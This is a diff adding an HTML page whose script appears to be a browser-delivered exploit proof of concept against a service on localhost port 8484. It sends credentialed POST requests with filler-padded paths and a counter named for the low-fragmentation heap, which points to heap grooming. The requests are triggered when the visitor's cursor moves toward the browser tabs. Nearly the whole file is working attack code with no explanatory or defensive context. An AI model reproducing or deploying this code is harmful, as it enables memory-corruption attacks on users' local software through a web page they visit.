@@ -1,0 +1,88 @@
+<html>
+<head>
+</head>
+<body>
+<img src="./Istr.png"/>
+
+<script>
+
+var radar = new Object();
+
+radar.ctor = function( addr, port = 80 ) {
+
+      this.AVOID_LFH = 0;
+	  
+	  this.index = 0;
+	  
+	  this.paths = [ 
+	                "/00" + Array( ( (0x38 + 0x20) / 2 ) - 4 ).join("\x42") + "/",
+					"/02" + Array( ( (0x38 + 0x20) / 2 ) - 4 ).join("\x43") + "/",
+					"/03" + Array( ( (0x38 + 0x20) / 2 ) - 4 ).join("\x44") + "/",
+					"/xxxx/"
+	               ];
+
+      this.HUMAN_TIME    = 120; /* ms */
+	  this.INTERVAL_TIME = 300; /* ms */
+
+      this.width  = window.innerWidth;
+	  this.height = window.innerHeight;
+	  
+	  this.tab_width     = ( Math.ceil( this.width / 6 ) ) + 80; 
+	  this.min_thin_red_line_h = 0 + 20;
+	  this.min_thin_red_line_w = 0; 
+	  
+	  this.NETWORK      = new XMLHttpRequest( );
+	  this.NETWORK.withCredentials = true;
+	  this.NETWORK.credentials     = true; 
+	  this.NETWORK.addr = addr;
+	  this.NETWORK.port = port;
+	  
+	  radar.NETWORK.post = function( data = null ) {
+   
+            this.post_data = data;
+		    index = radar.index;
+			this.open("POST", this.addr + ':' + this.port + radar.paths[ index ]);
+			this.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+			this.setRequestHeader('Orgin','localhost'); //<- ip addr
+			if( radar.index < 2 ) {
+			    ++radar.index;
+			}
+			this.send( this.post_data );
+      }
+	  
+	  radar.NETWORK.onreadystatechange = function( ) {
+	  
+	        if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {  
+			    if( radar.AVOID_LFH <= 1 ) {
+			        setTimeout('radar.NETWORK.post( radar.NETWORK.post_data );', radar.INTERVAL_TIME );
+				}
+				radar.AVOID_LFH++;
+			}
+			
+	  }
+	  
+}
+
+
+radar.cursor_tracer = function(event) {
+
+      x = event.clientX; 
+      y = event.clientY; 
+
+	  if( x >= radar.min_thin_red_line_w && x <= radar.tab_width ) {
+	      if( y <= radar.min_thin_red_line_h ) {
+		      setTimeout('radar.NETWORK.post( "for the glory of communism" );',this.HUMAN_TIME);
+		  }
+	  }
+	  
+}
+
+radar.ctor( 'http://127.0.0.1', 8484 );
+
+document.onmousemove = radar.cursor_tracer;
+
+
+</script>
+
+</body>
+</html>
